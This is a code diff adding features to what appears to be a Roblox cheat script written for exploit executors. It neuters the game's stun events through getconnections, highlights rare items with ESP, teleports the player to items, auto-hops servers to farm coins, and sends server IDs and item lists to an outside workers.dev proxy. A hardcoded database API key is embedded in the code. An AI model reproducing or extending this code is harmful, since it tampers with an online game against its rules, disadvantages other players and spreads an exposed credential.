+                    for _, c in ipairs(getconnections(S.batRemote.OnClientEvent)) do
+                        pcall(function() c:Disable() end)
+                    end
+                end)
+            end
+            if S.batStunConn then S.batStunConn:Disconnect() end
+            S.batStunConn = S.batRemote.OnClientEvent:Connect(function()
+                if not S.antiBatEnabled then return end
+                task.spawn(function()
+                    task.wait()
+                    local char = player.Character
+                    if not char then return end
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    if not hum or hum.Health <= 0 then return end
+                    pcall(function()
+                        hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+                        hum:SetStateEnabled(Enum.HumanoidStateType.Running, true)
+                        hum:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
+                        hum:ChangeState(Enum.HumanoidStateType.Running)
+                    end)
+                    pcall(function()
+                        for _, v in ipairs(char:GetDescendants()) do
+                            if v:IsA("AnimationTrack") then
+                                local n = v.Name:lower()
+                                if n:find("stun") or n:find("bat") or n:find("freeze") then
+                                    v:Stop(0.1)
+                                end
+                            end
+                        end
+                    end)
+                end)
+            end)
+            return true
+        end
+        if val then
+            local ok = applyAntiBat()
+            if ok then
+                Rayfield:Notify({ Title = "🦇 Anti-Bat Stun", Content = "ON — stun blocked.", Duration = 3, Image = 4483362458 })
+            else
+                Rayfield:Notify({ Title = "🦇 Anti-Bat Stun", Content = "Remote not found — watching...", Duration = 4, Image = 4483362458 })
+                task.spawn(function()
+                    while S.antiBatEnabled do
+                        task.wait(5)
+                        if applyAntiBat() then
+                            Rayfield:Notify({ Title = "🦇 Anti-Bat Stun", Content = "Remote found! Active.", Duration = 3, Image = 4483362458 })
+                            break
+                        end
+                    end
+                end)
+            end
+        else
+            if S.batStunConn then S.batStunConn:Disconnect() S.batStunConn = nil end
+            Rayfield:Notify({ Title = "🦇 Anti-Bat Stun", Content = "OFF.", Duration = 2, Image = 4483362458 })
+        end
+    end,
+})
+ExtraTab:CreateSection("👑 Brainrot ESP Extras")
+ExtraTab:CreateToggle({
+    Name         = "👑 Godly ESP",
+    CurrentValue = false,
+    Flag         = "GodlyESPExtra",
+    Callback     = function(val)
+        S.godlyESPEnabled = val
+        if val then
+            local function addGodlyESP()
+                pcall(function()
+                    local br = getBrainrotsFolder()
+                    local gd = br and br:FindFirstChild("Godly")
+                    if not gd then return end
+                    for _, obj in pairs(gd:GetChildren()) do
+                        if obj:IsA("Model") and not obj:FindFirstChild("GodlyESPExtra") then
+                            local h = Instance.new("Highlight")
+                            h.Parent              = obj
+                            h.FillColor           = Color3.fromRGB(255, 120, 30)
+                            h.OutlineColor        = Color3.fromRGB(255, 215, 0)
+                            h.FillTransparency    = 0.3
+                            h.OutlineTransparency = 0
+                            h.Name                = "GodlyESPExtra"
+                        end
+                    end
+                end)
+            end
+            addGodlyESP()
+            S.godlyESPConn = task.spawn(function()
+                while S.godlyESPEnabled do task.wait(1) addGodlyESP() end
+            end)
+            Rayfield:Notify({ Title = "👑 Godly ESP", Content = "ON", Duration = 2, Image = 4483362458 })
+        else
+            S.godlyESPEnabled = false
+            S.godlyESPConn    = nil
+            pcall(function()
+                for _, v in ipairs(workspace:GetDescendants()) do
+                    if v.Name == "GodlyESPExtra" then v:Destroy() end
+                end
+            end)
+            Rayfield:Notify({ Title = "👑 Godly ESP", Content = "OFF", Duration = 2, Image = 4483362458 })
+        end
+    end,
+})
+local _FULL_ESP_COLORS = {
+    Common    = { fill = Color3.fromRGB(180, 180, 180), outline = Color3.fromRGB(220, 220, 220) },
+    Rare      = { fill = Color3.fromRGB(80,  140, 255), outline = Color3.fromRGB(120, 180, 255) },
+    Epic      = { fill = Color3.fromRGB(180, 80,  255), outline = Color3.fromRGB(210, 130, 255) },
+    Legendary = { fill = Color3.fromRGB(255, 180, 0),   outline = Color3.fromRGB(255, 210, 60)  },
+    Mythic    = { fill = Color3.fromRGB(255, 80,  80),  outline = Color3.fromRGB(255, 140, 140) },
+    Secret    = { fill = Color3.fromRGB(80,  220, 220), outline = Color3.fromRGB(150, 255, 255) },
+    Celestial = { fill = Color3.fromRGB(255, 220, 100), outline = Color3.fromRGB(255, 255, 180) },
+    Godly     = { fill = Color3.fromRGB(255, 120, 30),  outline = Color3.fromRGB(255, 215, 0)   },
+    Forbidden = { fill = Color3.fromRGB(140, 30,  200), outline = Color3.fromRGB(200, 80,  255) },
+}
+ExtraTab:CreateToggle({
+    Name         = "🌈 Full Rarity ESP",
+    CurrentValue = false,
+    Flag         = "FullRarityESPExtra",
+    Callback     = function(val)
+        S.fullESPEnabled = val
+        if val then
+            local function addFullESP()
+                pcall(function()
+                    local brFolder = getBrainrotsFolder()
+                    if not brFolder then return end
+                    for rarityName, colors in pairs(_FULL_ESP_COLORS) do
+                        local rarFolder = brFolder:FindFirstChild(rarityName)
+                        if not rarFolder then continue end
+                        for _, obj in pairs(rarFolder:GetChildren()) do
+                            if obj:IsA("Model") and not obj:FindFirstChild("FullRarityESP") then
+                                local h = Instance.new("Highlight")
+                                h.Parent              = obj
+                                h.FillColor           = colors.fill
+                                h.OutlineColor        = colors.outline
+                                h.FillTransparency    = 0.35
+                                h.OutlineTransparency = 0
+                                h.Name                = "FullRarityESP"
+                            end
+                        end
+                    end
+                end)
+            end
+            addFullESP()
+            S.fullESPConn = task.spawn(function()
+                while S.fullESPEnabled do task.wait(1.5) addFullESP() end
+            end)
+            Rayfield:Notify({ Title = "🌈 Full Rarity ESP", Content = "ON — all rarities highlighted.", Duration = 3, Image = 4483362458 })
+        else
+            S.fullESPEnabled = false
+            S.fullESPConn    = nil
+            pcall(function()
+                for _, v in ipairs(workspace:GetDescendants()) do
+                    if v.Name == "FullRarityESP" then v:Destroy() end
+                end
+            end)
+            Rayfield:Notify({ Title = "🌈 Full Rarity ESP", Content = "OFF", Duration = 2, Image = 4483362458 })
+        end
+    end,
+})
+;(function()
+local RARITY_COLORS = {
+    Common    = Color3.fromRGB(180, 180, 180),
+    Uncommon  = Color3.fromRGB(100, 220, 100),
+    Rare      = Color3.fromRGB(80,  140, 255),
+    Epic      = Color3.fromRGB(180, 80,  255),
+    Legendary = Color3.fromRGB(255, 180, 0),
+    Mythic    = Color3.fromRGB(255, 80,  80),
+    Secret    = Color3.fromRGB(80,  220, 220),
+    Celestial = Color3.fromRGB(255, 220, 100),
+    Godly     = Color3.fromRGB(255, 120, 30),
+}
+local MUTATION_COLORS = {
+    Gold      = Color3.fromRGB(255, 215, 0),
+    Emerald   = Color3.fromRGB(80,  200, 120),
+    Diamond   = Color3.fromRGB(150, 220, 255),
+    Cheese    = Color3.fromRGB(255, 200, 50),
+    Bloodmoon = Color3.fromRGB(200, 40,  40),
+    Rainbow   = Color3.fromRGB(255, 100, 200),
+    Normal    = Color3.fromRGB(120, 120, 140),
+}
+local listGui = Instance.new("ScreenGui")
+listGui.Name           = "OxyoBrainrotList"
+listGui.ResetOnSpawn   = false
+listGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+listGui.DisplayOrder   = 999
+listGui.IgnoreGuiInset = true
+pcall(function() listGui.Parent = game:GetService("CoreGui") end)
+if not listGui.Parent then listGui.Parent = player.PlayerGui end
+local panel = Instance.new("Frame")
+panel.Name             = "Panel"
+panel.Size             = UDim2.new(0, 320, 0, 400)
+panel.Position         = UDim2.new(0.5, -160, 0.5, -200)
+panel.BackgroundColor3 = Color3.fromRGB(13, 13, 20)
+panel.BorderSizePixel  = 0
+panel.Visible          = false
+panel.ClipsDescendants = true
+panel.Parent           = listGui
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 10)
+local ps = Instance.new("UIStroke", panel)
+ps.Color     = Color3.fromRGB(55, 55, 75)
+ps.Thickness = 1
+local titleBar = Instance.new("Frame", panel)
+titleBar.Name             = "TitleBar"
+titleBar.Size             = UDim2.new(1, 0, 0, 40)
+titleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+titleBar.BorderSizePixel  = 0
+Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)
+local tbFix = Instance.new("Frame", titleBar)
+tbFix.Size             = UDim2.new(1, 0, 0, 10)
+tbFix.Position         = UDim2.new(0, 0, 1, -10)
+tbFix.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+tbFix.BorderSizePixel  = 0
+local titleLabel = Instance.new("TextLabel", titleBar)
+titleLabel.Size                  = UDim2.new(1, -50, 1, 0)
+titleLabel.Position              = UDim2.new(0, 14, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.TextColor3            = Color3.fromRGB(240, 240, 255)
+titleLabel.TextXAlignment        = Enum.TextXAlignment.Left
+titleLabel.Font                  = Enum.Font.GothamBold
+titleLabel.TextSize              = 14
+titleLabel.Text                  = "🧠  Brainrot List"
+local closeBtn = Instance.new("TextButton", titleBar)
+closeBtn.Size             = UDim2.new(0, 26, 0, 26)
+closeBtn.Position         = UDim2.new(1, -33, 0.5, -13)
+closeBtn.BackgroundColor3 = Color3.fromRGB(160, 35, 35)
+closeBtn.Text             = "✕"
+closeBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
+closeBtn.Font             = Enum.Font.GothamBold
+closeBtn.TextSize         = 12
+closeBtn.BorderSizePixel  = 0
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+local infoBar = Instance.new("Frame", panel)
+infoBar.Size             = UDim2.new(1, -16, 0, 32)
+infoBar.Position         = UDim2.new(0, 8, 0, 44)
+infoBar.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+infoBar.BorderSizePixel  = 0
+Instance.new("UICorner", infoBar).CornerRadius = UDim.new(0, 6)
+local rarityLabel = Instance.new("TextLabel", infoBar)
+rarityLabel.Size                  = UDim2.new(0.55, 0, 1, 0)
+rarityLabel.Position              = UDim2.new(0, 10, 0, 0)
+rarityLabel.BackgroundTransparency = 1
+rarityLabel.TextColor3            = Color3.fromRGB(170, 170, 210)
+rarityLabel.Font                  = Enum.Font.Gotham
+rarityLabel.TextSize              = 11
+rarityLabel.TextXAlignment        = Enum.TextXAlignment.Left
+rarityLabel.Text                  = "Viewing: All"
+local countLabel = Instance.new("TextLabel", infoBar)
+countLabel.Size                  = UDim2.new(0.45, -10, 1, 0)
+countLabel.Position              = UDim2.new(0.55, 0, 0, 0)
+countLabel.BackgroundTransparency = 1
+countLabel.TextColor3            = Color3.fromRGB(100, 210, 100)
+countLabel.Font                  = Enum.Font.GothamBold
+countLabel.TextSize              = 11
+countLabel.TextXAlignment        = Enum.TextXAlignment.Right
+countLabel.Text                  = "Count: 0"
+local searchBar = Instance.new("TextBox", panel)
+searchBar.Size                  = UDim2.new(1, -16, 0, 30)
+searchBar.Position              = UDim2.new(0, 8, 0, 82)
+searchBar.BackgroundColor3      = Color3.fromRGB(30, 30, 50)
+searchBar.BorderSizePixel       = 0
+searchBar.TextColor3            = Color3.fromRGB(230, 230, 255)
+searchBar.PlaceholderText       = "🔍  Search..."
+searchBar.PlaceholderColor3     = Color3.fromRGB(100, 100, 140)
+searchBar.Font                  = Enum.Font.Gotham
+searchBar.TextSize              = 12
+searchBar.TextXAlignment        = Enum.TextXAlignment.Left
+searchBar.ClearTextOnFocus      = false
+searchBar.Text                  = ""
+Instance.new("UICorner", searchBar).CornerRadius = UDim.new(0, 7)
+local sbs = Instance.new("UIStroke", searchBar)
+sbs.Color     = Color3.fromRGB(80, 80, 130)
+sbs.Thickness = 1.5
+local sbPad = Instance.new("UIPadding", searchBar)
+sbPad.PaddingLeft = UDim.new(0, 8)
+local scrollFrame = Instance.new("ScrollingFrame", panel)
+scrollFrame.Size                 = UDim2.new(1, -16, 1, -124)
+scrollFrame.Position             = UDim2.new(0, 8, 0, 118)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel      = 0
+scrollFrame.ScrollBarThickness   = 4
+scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 70, 110)
+scrollFrame.CanvasSize           = UDim2.new(0, 0, 0, 0)
+scrollFrame.AutomaticCanvasSize  = Enum.AutomaticSize.Y
+scrollFrame.ElasticBehavior      = Enum.ElasticBehavior.Always
+local listLayout = Instance.new("UIListLayout", scrollFrame)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Padding   = UDim.new(0, 5)
+local lp = Instance.new("UIPadding", scrollFrame)
+lp.PaddingLeft  = UDim.new(0, 1)
+lp.PaddingRight = UDim.new(0, 1)
+lp.PaddingTop   = UDim.new(0, 2)
+local listPanelVisible, listEntries, listUpdateThread, currentRarityFilter, currentSearchQuery = false, {}, nil, nil, ""
+searchBar:GetPropertyChangedSignal("Text"):Connect(function()
+    currentSearchQuery = searchBar.Text:lower()
+    pcall(refreshList)
+end)
+local function clearListEntries()
+    for _, f in pairs(listEntries) do pcall(function() f:Destroy() end) end
+    listEntries = {}
+end
+local function makeEntry(entry, order)
+    local td     = S.traitData[entry.obj]
+    local traits = (td and #td.traitNames > 0) and table.concat(td.traitNames, "+") or "—"
+    local mut    = entry.mutation or "Normal"
+    local rCol   = RARITY_COLORS[entry.rarity]  or Color3.fromRGB(200, 200, 200)
+    local mCol   = MUTATION_COLORS[mut]          or Color3.fromRGB(140, 140, 140)
+    local card = Instance.new("Frame", scrollFrame)
+    card.Size             = UDim2.new(1, -4, 0, 60)
+    card.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    card.BorderSizePixel  = 0
+    card.LayoutOrder      = order
+    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 7)
+    local cs = Instance.new("UIStroke", card)
+    cs.Color        = rCol
+    cs.Thickness    = 1
+    cs.Transparency = 0.55
+    local bar = Instance.new("Frame", card)
+    bar.Size             = UDim2.new(0, 4, 1, 0)
+    bar.BackgroundColor3 = rCol
+    bar.BorderSizePixel  = 0
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 4)
+    local nameL = Instance.new("TextLabel", card)
+    nameL.Size                  = UDim2.new(1, -100, 0, 20)
+    nameL.Position              = UDim2.new(0, 12, 0, 5)
+    nameL.BackgroundTransparency = 1
+    nameL.TextColor3            = Color3.fromRGB(240, 240, 255)
+    nameL.Font                  = Enum.Font.GothamBold
+    nameL.TextSize              = 12
+    nameL.TextXAlignment        = Enum.TextXAlignment.Left
+    nameL.TextTruncate          = Enum.TextTruncate.AtEnd
+    nameL.Text                  = tostring(entry.name or "?")
+    local rarL = Instance.new("TextLabel", card)
+    rarL.Size                  = UDim2.new(1, -100, 0, 14)
+    rarL.Position              = UDim2.new(0, 12, 0, 24)
+    rarL.BackgroundTransparency = 1
+    rarL.TextColor3            = rCol
+    rarL.Font                  = Enum.Font.Gotham
+    rarL.TextSize              = 10
+    rarL.TextXAlignment        = Enum.TextXAlignment.Left
+    rarL.Text                  = entry.rarity
+    local infoL = Instance.new("TextLabel", card)
+    infoL.Size                  = UDim2.new(1, -100, 0, 14)
+    infoL.Position              = UDim2.new(0, 12, 0, 39)
+    infoL.BackgroundTransparency = 1
+    infoL.TextColor3            = mCol
+    infoL.Font                  = Enum.Font.Gotham
+    infoL.TextSize              = 9
+    infoL.TextXAlignment        = Enum.TextXAlignment.Left
+    infoL.Text                  = "Mut: " .. mut .. "  ·  Trait: " .. traits
+    local tpBtn = Instance.new("TextButton", card)
+    tpBtn.Size             = UDim2.new(0, 68, 0, 26)
+    tpBtn.Position         = UDim2.new(1, -76, 0.5, -13)
+    tpBtn.BackgroundColor3 = Color3.fromRGB(35, 75, 160)
+    tpBtn.Text             = "⟶ TP"
+    tpBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
+    tpBtn.Font             = Enum.Font.GothamBold
+    tpBtn.TextSize         = 11
+    tpBtn.BorderSizePixel  = 0
+    Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 6)
+    tpBtn.MouseButton1Click:Connect(function()
+        pcall(function()
+            local obj = entry.obj
+            if not obj or not obj.Parent then
+                Rayfield:Notify({ Title = "Brainrot List", Content = "Brainrot no longer exists!", Duration = 3, Image = 4483362458 })
+                return
+            end
+            local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+            if part then
+                hideLava()
+                safeTeleport(part.CFrame * CFrame.new(0, 4, 0))
+                Rayfield:Notify({ Title = "Teleported!", Content = entry.name, Duration = 2, Image = 4483362458 })
+            end
+        end)
+    end)
+    tpBtn.MouseEnter:Connect(function() tpBtn.BackgroundColor3 = Color3.fromRGB(55, 100, 200) end)
+    tpBtn.MouseLeave:Connect(function() tpBtn.BackgroundColor3 = Color3.fromRGB(35, 75, 160) end)
+    table.insert(listEntries, card)
+end
+local function refreshList()
+    clearListEntries()
+    local snapshot = monitorData.brainrots
+    local filtered = {}
+    for _, entry in ipairs(snapshot) do
+        if entry.obj and entry.obj.Parent then
+            if currentRarityFilter == nil or entry.rarity == currentRarityFilter then
+                if currentSearchQuery == "" or entry.name:lower():find(currentSearchQuery, 1, true) then
+                    table.insert(filtered, entry)
+                end
+            end
+        end
+    end
+    table.sort(filtered, function(a, b)
+        local ra = RARITY_ORDER[a.rarity] or 99
+        local rb = RARITY_ORDER[b.rarity] or 99
+        if ra ~= rb then return ra < rb end
+        local ma = (a.mutation ~= "Normal") and 0 or 1
+        local mb = (b.mutation ~= "Normal") and 0 or 1
+        if ma ~= mb then return ma < mb end
+        return a.name < b.name
+    end)
+    for i, entry in ipairs(filtered) do makeEntry(entry, i) end
+    rarityLabel.Text = "Viewing: " .. (currentRarityFilter or "All")
+    countLabel.Text  = "Count: " .. #filtered
+end
+local function stopListUpdate()
+    listPanelVisible = false
+    if listUpdateThread then pcall(task.cancel, listUpdateThread) listUpdateThread = nil end
+end
+local function showPanel(rarityFilter)
+    currentRarityFilter = rarityFilter
+    currentSearchQuery  = ""
+    searchBar.Text      = ""
+    listPanelVisible    = true
+    panel.Visible       = true
+    scrollFrame.CanvasPosition = Vector2.new(0, 0)
+    pcall(refreshList)
+    if listUpdateThread then pcall(task.cancel, listUpdateThread) end
+    listUpdateThread = task.spawn(function()
+        while listPanelVisible do
+            task.wait(3)
+            pcall(refreshList)
+        end
+    end)
+end
+closeBtn.MouseButton1Click:Connect(function()
+    panel.Visible = false
+    stopListUpdate()
+end)
+local drag = { active=false, start=nil, startPos=nil }
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        drag.active   = true
+        drag.start    = input.Position
+        drag.startPos = panel.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                drag.active = false
+            end
+        end)
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if not drag.active then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+    or input.UserInputType == Enum.UserInputType.Touch then
+        local d = input.Position - drag.start
+        panel.Position = UDim2.new(
+            drag.startPos.X.Scale, drag.startPos.X.Offset + d.X,
+            drag.startPos.Y.Scale, drag.startPos.Y.Offset + d.Y
+        )
+    end
+end)
+BrainrotListTab:CreateSection("Rarities")
+BrainrotListTab:CreateButton({
+    Name     = "📋  All Brainrots",
+    Callback = function() showPanel(nil) end,
+})
+for _, rarity in ipairs({"Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly"}) do
+    BrainrotListTab:CreateButton({
+        Name     = rarity,
+        Callback = function() showPanel(rarity) end,
+    })
+end
+end)()
+pcall(function() Rayfield:LoadConfiguration() end)
+task.spawn(function()
+    while true do
+        task.wait(30)
+        pcall(function() Rayfield:SaveConfiguration() end)
+    end
+end)
+if getgenv().OxyoAutoHopCoin == true and not getgenv().OxyoHopStopped then
+    S.autoHopCoinEnabled = true
+    S.autoCoinEnabled    = true
+    coinEventActive      = false
+    if coinCollectThread then pcall(task.cancel, coinCollectThread) coinCollectThread = nil end
+    hideLava()
+    startCoinTracker()
+    showStopHopGui()
+    task.spawn(function()
+        startCoinTracker()
+        task.wait(5)
+        Rayfield:Notify({ Title = "Auto Hop", Content = "Checking for Coin Rain...", Duration = 3, Image = 4483362458 })
+        local status, timeLeft = waitForCoinRainStatus(15)
+        if not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped then return end
+
+        if not status then
+            task.wait(1)
+            status, timeLeft = getCoinRainStatus()
+            if not status then
+                local s2, t2 = _detectCoinRainFallback()
+                if s2 then status, timeLeft = s2, t2 end
+            end
+        end
+        if status == "active" then
+            if (timeLeft or 60) < 8 then
+                Rayfield:Notify({ Title = "Auto Hop", Content = "Coin Rain almost done — hopping...", Duration = 2, Image = 4483362458 })
+                task.wait(1)
+                if getgenv().OxyoAutoHopCoin and not getgenv().OxyoHopStopped then task.spawn(smartHop) end
+            else
+                local coins = findCoins()
+                Rayfield:Notify({ Title = "🪙 Coin Rain!", Content = "Active — farming " .. #coins .. " coins!", Duration = 3, Image = 4483362458 })
+                coinEventActive   = true
+                S.coinEventDuration = timeLeft or 60
+                startCoinCollect()
+            end
+        else
+            local queuedSecs = _getCoinRainQueuedTime()
+            if queuedSecs and queuedSecs > 0 and queuedSecs <= 1200 then
+                local mins = math.floor(queuedSecs / 60)
+                local secs = queuedSecs % 60
+                Rayfield:Notify({
+                    Title   = "🪙 Coin Rain Incoming!",
+                    Content = string.format("Queued in %dm %ds — waiting on this server!", mins, secs),
+                    Duration = 6, Image = 4483362458,
+                })
+                local waited2 = 0
+                while waited2 < queuedSecs + 15
+                    and getgenv().OxyoAutoHopCoin
+                    and not getgenv().OxyoHopStopped
+                do
+                    task.wait(2)
+                    waited2 = waited2 + 2
+                    local s2, t2 = getCoinRainStatus()
+                    if s2 == "active" and (t2 or 0) >= 8 then
+                        coinEventActive     = true
+                        S.coinEventDuration = t2 or 60
+                        startCoinCollect()
+                        return
+                    end
+                end
+                if getgenv().OxyoAutoHopCoin and not getgenv().OxyoHopStopped then task.spawn(smartHop) end
+            else
+                Rayfield:Notify({ Title = "Auto Hop", Content = "No Coin Rain — hopping...", Duration = 2, Image = 4483362458 })
+                task.wait(5)
+                if getgenv().OxyoAutoHopCoin and not getgenv().OxyoHopStopped then task.spawn(smartHop) end
+            end
+        end
+    end)
+end
+if getgenv().OxyoAutoHopGodly == true and not getgenv().OxyoHopGodlyStopped then
+    S.autoHopGodlyEnabled = true
+    getgenv().OxyoHopStopped = false
+    hideLava()
+    showStopHopGui()
+    S.autoHopGodlyThread = task.spawn(function()
+        task.wait(5)
+        runRarityHopFarm("Godly", "OxyoAutoHopGodly", "OxyoHopGodlyStopped")
+    end)
+end
+if getgenv().OxyoAutoHopCel == true and not getgenv().OxyoHopCelStopped then
+    S.autoHopCelEnabled = true
+    getgenv().OxyoHopStopped = false
+    hideLava()
+    showStopHopGui()
+    S.autoHopCelThread = task.spawn(function()
+        task.wait(5)
+        runRarityHopFarm("Celestial", "OxyoAutoHopCel", "OxyoHopCelStopped")
+    end)
+end
+if getgenv().OxyoAutoHopFrag == true and not getgenv().OxyoHopFragStopped then
+    S.autoHopFragEnabled = true
+    getgenv().OxyoHopStopped = false
+    hideLava()
+    showStopHopGui()
+    S.autoHopFragThread = task.spawn(function()
+        task.wait(5)
+        runFragHopFarm("OxyoAutoHopFrag", "OxyoHopFragStopped")
+    end)
+end
+;(function()
+local _isPrivateServer = getgenv()._isPrivateServer or function() return false end
+
+local _SB_URL     = "https://webhooksqw.mohammadahmadqazplm.workers.dev"
+local _SB_KEY     = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5d2Z4Z2trcGl5eGF5ZHdxeXRlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MDA3NzcsImV4cCI6MjA5MTE3Njc3N30.mSs9Vko1yDVWSS-7-CJJUBNm36udqyalNxg0q6ZOmxM"
+local _FB_HTTP    = game:GetService("HttpService")
+local _FB_JOBKEY  = tostring(game.JobId):gsub("-", "_")
+local _FB_JOBID   = tostring(game.JobId)
+local _fbHttpExec = (typeof(request)        == "function" and request)
+                 or (typeof(http_request)   == "function" and http_request)
+                 or (typeof(http)           == "table" and typeof(http.request)   == "function" and http.request)
+                 or (typeof(syn)            == "table" and typeof(syn.request)    == "function" and syn.request)
+                 or (typeof(fluxus)         == "table" and typeof(fluxus.request) == "function" and fluxus.request)
+                 or nil
+
+local function _sbRaw(method, tbl, qparams, data, timeout)
+    if not _fbHttpExec then return nil end
+    timeout = timeout or 7
+    local url = _SB_URL .. "/rest/v1/" .. tbl
+    if qparams and qparams ~= "" then url = url .. "?" .. qparams end
+    local headers = {
+        ["Content-Type"]  = "application/json",
+        ["apikey"]        = _SB_KEY,
+        ["Authorization"] = "Bearer " .. _SB_KEY,
+    }
+    if method == "POST" then
+        headers["Prefer"] = "resolution=merge-duplicates,return=minimal"
+    elseif method == "DELETE" or method == "PATCH" then
+        headers["Prefer"] = "return=minimal"
+    end
+    local done, result = false, nil
+    local signal = Instance.new("BindableEvent")
+    task.spawn(function()
+        local ok, res = pcall(_fbHttpExec, {
+            Url     = url,
+            Method  = method,
+            Headers = headers,
+            Body    = (data ~= nil) and _FB_HTTP:JSONEncode(data) or nil,
+        })
+        if ok and res then
+            local status = tonumber(res.StatusCode or res.status) or 0
+            if status >= 200 and status < 300 then
+                local body = res.Body
+                if body and body ~= "" then
+                    local ok2, dec = pcall(_FB_HTTP.JSONDecode, _FB_HTTP, body)
+                    if ok2 then result = dec else result = true end
+                else
+                    result = true
+                end
+            end
+        end
+        if not done then done = true pcall(function() signal:Fire() end) end
+    end)
+    local deadline = tick() + timeout
+    local conn = signal.Event:Connect(function()
+        done = true pcall(function() conn:Disconnect() end)
+    end)
+    while not done and tick() < deadline do RunService.Heartbeat:Wait() end
+    done = true
+    pcall(function() conn:Disconnect() end)
+    pcall(function() signal:Destroy() end)
+    return result
+end
+
+local function _fbReq(method, path, data, timeout)
+    local parts = {}
+    for p in path:gmatch("[^/]+") do table.insert(parts, p) end
+    local tbl    = parts[1] or ""
+    local rowKey = parts[2]
+
+    if tbl == "sv" then
+        if method == "GET" and not rowKey then
+            local rows = _sbRaw("GET", "sv", "select=*&place_id=eq." .. tostring(game.PlaceId), nil, timeout)
+            if type(rows) ~= "table" then return nil end
+            local out = {}
+            for _, row in ipairs(rows) do
+                if row.job_key then
+                    out[row.job_key] = {
+                        j = row.job_id,
+                        p = row.place_id,
+                        t = row.t,
+                        c = row.c,
+                        b = row.b or {},
+                    }
+                end
+            end
+            return out
+        elseif method == "PUT" and rowKey then
+            local payload = { job_key = rowKey, place_id = tostring(game.PlaceId) }
+            if data then
+                if data.j then payload.job_id   = data.j end
+                if data.p then payload.place_id = tostring(data.p) end
+                if data.t then payload.t        = data.t end
+                if data.c ~= nil then payload.c = data.c end
+                if data.b then payload.b        = data.b end
+            end
+            local r = _sbRaw("POST", "sv", nil, payload, timeout)
+            return r ~= nil and {} or nil
+        elseif method == "PATCH" and rowKey then
+            local payload = {}
+            if data then
+                if data.t        then payload.t = data.t end
+                if data.c ~= nil then payload.c = data.c end
+            end
+            local r = _sbRaw("PATCH", "sv", "job_key=eq." .. rowKey, payload, timeout)
+            return r ~= nil and {} or nil
+        elseif method == "DELETE" and rowKey then
+            _sbRaw("DELETE", "sv", "job_key=eq." .. rowKey, nil, timeout)
+            return {}
+        end
+
+    elseif tbl == "uc" then
+        if method == "GET" and not rowKey then
+            local rows = _sbRaw("GET", "uc", "select=*&place_id=eq." .. tostring(game.PlaceId), nil, timeout)
+            if type(rows) ~= "table" then return nil end
+            local out = {}
+            for _, row in ipairs(rows) do
+                if row.uc_key then out[row.uc_key] = { t = row.t } end
+            end
+            return out
+        elseif method == "PUT" and rowKey then
+            local payload = { uc_key = rowKey, place_id = tostring(game.PlaceId) }
+            if data and data.t then payload.t = data.t end
+            local r = _sbRaw("POST", "uc", nil, payload, timeout)
+            return r ~= nil and {} or nil
+        elseif method == "DELETE" and rowKey then
+            _sbRaw("DELETE", "uc", "uc_key=eq." .. rowKey, nil, timeout)
+            return {}
+        end
+    end
+    return nil
+end
+local _CB_THRESHOLD, _CB_COOLDOWN, _cbFails, _cbTripped, _cbTripTime = 5, 45, 0, false, 0
+local function _cbRecord(success)
+    if success then
+        _cbFails = 0 _cbTripped = false
+    else
+        _cbFails = _cbFails + 1
+        if _cbFails >= _CB_THRESHOLD and not _cbTripped then
+            _cbTripped  = true
+            _cbTripTime = tick()
+        end
+    end
+end
+local function _cbAllow()
+    if not _cbTripped then return true end
+    if tick() - _cbTripTime >= _CB_COOLDOWN then _cbTripped=false _cbFails=0 return true end
+    return false
+end
+local _readCache = {}
+local _readCacheTTL = 20
+local function _fbSafe(method, path, data, timeout)
+    if not _cbAllow() then return nil end
+    if method == "GET" then
+        local cached = _readCache[path]
+        if cached and (tick() - cached.t) < _readCacheTTL then
+            return cached.v
+        end
+    end
+    local res = _fbReq(method, path, data, timeout)
+    _cbRecord(res ~= nil)
+    if method == "GET" and res ~= nil then
+        _readCache[path] = { t = tick(), v = res }
+    end
+    return res
+end
+local _reporterActive, _reporterThread, _reporterLastWrite = false, nil, 0
+local function _getBrainrotList()
+    local list = {}
+    for _, e in ipairs(monitorData.brainrots) do
+        if e.obj and e.obj.Parent then
+            local traitArr = nil
+            local td = S.traitData[e.obj]
+            if td and #td.traitNames > 0 then
+                traitArr = td.traitNames
+            end
+            table.insert(list, {
+                n = e.name,
+                r = e.rarity,
+                m = (e.mutation and e.mutation ~= "Normal") and e.mutation or nil,
+                t = traitArr,
+            })
+        end
+    end
+    return list
+end
+local function _getReporterInterval(count)
+    if _cbFails > 2 then return 90 end
+    if count == 0  then return 75 end
+    if count >= 10 then return 45 end
+    return 60
+end
+local _lastReportedCount = -1
+local _lastReportedHash  = ""
+local function _listHash(list)
+    local s = ""
+    for _, e in ipairs(list) do s = s .. (e.name or "") .. "," end
+    return s
+end
